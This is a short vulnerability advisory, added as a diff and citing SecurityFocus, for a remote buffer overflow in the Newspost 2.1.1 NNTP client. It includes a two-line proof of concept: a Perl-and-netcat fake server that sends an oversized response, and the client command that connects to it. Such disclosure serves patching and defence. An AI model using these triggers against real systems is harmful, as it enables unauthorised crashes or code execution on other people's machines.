@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/12418/info
+
+Newspost is prone to a remote buffer overflow vulnerability due to an unbounded memory copy operation.
+
+The problem occurs in the 'socket_getline()' function of 'socket.c' when the vulnerable client handles NNTP server responses.
+
+Successful exploitation of this issue could potentially lead to arbitrary code execution.
+
+This issue was reported to affect Newspost 2.1.1 and prior, however, other versions may be vulnerable. 
+
+Create a server:
+perl -e 'print "A" x 1024;print "BBBBCCCCDDDDEEEE"'| nc -v -l -p 119
+
+Connect to it:
+newspost -s test -i localhost -f me@me.nl -n news.news /etc/hosts
